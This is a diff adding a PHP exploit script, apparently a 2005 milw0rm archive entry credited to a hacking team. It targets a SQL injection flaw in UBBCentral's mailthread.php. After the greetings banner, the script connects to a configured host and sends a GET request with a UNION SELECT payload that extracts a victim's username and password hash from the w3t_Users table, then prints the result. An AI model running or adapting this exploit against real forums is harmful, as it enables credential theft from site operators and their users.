@@ -1,0 +1,49 @@
+<?php
+#############################################################################
+#      T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
+#############################################################################
+# Vulnerable:   UBBCentral SQL Injection
+#
+# Exploit By :  MH_p0rtal
+#
+# Discovered By: James Bercegay
+#############################################################################
+#  Gr33tz To ==>   Alpha_programmer , Oil_karchack , The_CephaleX , Str0ke
+#
+#  And Iranian Hacking & Security Teams :
+#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,
+#  Crouz Security Team  & Simorgh-ev Security Team
+#############################################################################
+# ___________Config :
+# please replace your address :
+$url = "http:///www.example.com";
+# please replace your dir address :
+$dirs = "/dir/to/ubbt/";
+# __________End Config
+#############################################################################
+$aa = strlen ( $dirs );
+$ab = $aa - 1;
+$ac = 0;
+if ((  $dirs[$ab] == "/" )  &&  ( $dirs[$ac] == "/" ))   {
+$merg = $dirs.mailthread.php;
+$fc = fsockopen("$url", 80, $errno, $errstr, 30);
+if (!$fc) {
+
+echo "Can't Connect\n";
+} else {
+   $mh = "GET $merg?Cat=0&Board=UBB2&Number=-99'%20UNION%20SELECT%20U_Username,U_Password%20FROM%20w3t_Users%20WHERE%20U_Username%20=%20'victim'/*&page=0&vc=1&fpart=1&what=showflat  HTTP/1.1\r\n";
+   $mh .= "Host: $url\r\n";
+   $mh .= "Connection: Close\r\n\r\n";
+
+  fwrite($fc, $mh);
+  while (!feof($fc)) {
+  echo fgets($fc, 1024);
+  }
+   fclose($fc);
+}
+} else {
+echo " Your pattern doesn't equal with Exploit directory pattern ";
+}
+?>
+
+# milw0rm.com [2005-06-25]
